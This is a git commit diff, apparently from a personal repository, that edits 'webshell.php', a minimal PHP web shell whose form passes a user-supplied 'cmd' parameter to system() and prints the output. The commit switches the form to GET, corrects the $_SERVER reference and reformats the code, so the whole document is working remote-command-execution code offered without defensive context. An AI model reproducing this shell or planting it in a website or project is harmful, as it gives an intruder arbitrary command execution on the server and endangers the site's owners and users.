4d53b576064e11c3baf04dc30935ccd2c3dd8aec
SMONGS <62112908+SmongsDev@users.noreply.github.com>
2024-04-21 15:03:01 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,14 +1,15 @@
 <html>
 <body>
-<form method="post" name="<?php echo basename($SERVER['PHP_SELF']); ?>">
-<input type="text" name="cmd" autofocus id="cmd" size="80">
-<input type="submit" value="Execute">
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
 </form>
 <pre>
 <?php
-  if(isset($_GET['cmd'])){
-    system($_GET['cmd']);
-  }
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
 ?>
 </pre>
 </body>
